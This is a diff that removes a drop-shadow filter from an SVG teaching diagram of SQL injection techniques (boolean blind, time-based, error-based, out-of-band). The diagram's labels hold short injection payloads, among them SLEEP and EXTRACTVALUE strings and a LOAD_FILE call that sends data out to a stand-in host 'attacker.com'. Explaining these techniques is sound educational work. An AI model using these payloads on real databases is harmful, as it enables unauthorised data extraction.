@@ -67,11 +67,6 @@
       <stop offset="100%" stop-color="#574a68"/>
     </linearGradient>
 
-    <!-- Drop shadow -->
-    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
-      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#00000044"/>
-    </filter>
-
     <!-- Arrow markers -->
     <marker id="arrow" markerWidth="14" markerHeight="14" refX="11" refY="6" orient="auto" markerUnits="userSpaceOnUse">
       <path d="M0,0 L12,6 L0,12 L3,6 Z" fill="#243b59"/>
@@ -95,23 +90,23 @@
       <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
     </marker>
   </defs>
-  <rect x="40" y="40" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
+  <rect x="40" y="40" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2"/>
   <text x="330.9092" y="86.774131633711" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Boolean-Based Blind</text>
   <text x="330.9092" y="120.451572216439" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Different response for TRUE vs FALSE</text>
   <text x="330.9092" y="148.516051196666" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
-  <rect x="658.1819" y="40" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
+  <rect x="658.1819" y="40" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2"/>
   <text x="949.0909" y="86.774131633711" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--warn-accent)" font-family="Arial, sans-serif">Time-Based Blind</text>
   <text x="949.0909" y="120.451572216439" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">SLEEP/WAITFOR delays on TRUE</text>
   <text x="949.0909" y="148.516051196666" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">1' AND SLEEP(5)-- (5s delay)</text>
-  <rect x="40" y="208.387093236212" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
+  <rect x="40" y="208.387093236212" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2"/>
   <text x="330.9092" y="255.161224869924" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--danger-accent)" font-family="Arial, sans-serif">Error-Based</text>
   <text x="330.9092" y="288.838665452651" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">Force errors that leak data</text>
   <text x="330.9092" y="316.903254110303" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
-  <rect x="658.1819" y="208.387093236212" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
+  <rect x="658.1819" y="208.387093236212" width="581.8181" height="130.967787929243" rx="6.283619431803" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2"/>
   <text x="949.0909" y="255.161224869924" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--ok-accent)" font-family="Arial, sans-serif">Out-of-Band (OOB)</text>
   <text x="949.0909" y="288.838665452651" text-anchor="middle" font-size="18.329736790531" fill="var(--text)" font-family="Arial, sans-serif">DNS/HTTP to attacker server</text>
   <text x="949.0909" y="316.903254110303" text-anchor="middle" font-size="18.329736790531" fill="var(--text-muted)" font-family="Courier New, monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
-  <rect x="94.5455" y="414.193491779393" width="1090.9091" height="205.806508220607" rx="6.283619431803" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
+  <rect x="94.5455" y="414.193491779393" width="1090.9091" height="205.806508220607" rx="6.283619431803" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2"/>
   <text x="640" y="460.96773309053" text-anchor="middle" font-size="21.995600367045" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Technique Comparison</text>
   <text x="240" y="507.741864724242" text-anchor="middle" font-size="18.329736790531" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Speed</text>
   <text x="494.5455" y="507.741864724242" text-anchor="middle" font-size="18.329736790531" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Reliability</text>
